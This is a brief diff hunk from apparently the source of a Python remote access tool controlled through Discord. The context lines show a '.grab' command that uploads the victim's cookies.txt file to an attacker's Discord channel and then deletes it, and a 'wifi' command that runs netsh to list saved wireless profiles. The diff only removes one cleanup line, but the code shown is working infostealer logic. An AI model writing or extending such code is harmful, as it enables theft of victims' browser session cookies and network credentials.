@@ -35,7 +35,6 @@ elif message.content[:5] == '.grab':
             await asyncio.sleep(1)
             reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
             subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
-            subprocess.run(f'del C:\\Users\\{getuser()}\\tmp', shell=True)
             
         elif message.content[6:].lower() == 'wifi':
             networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
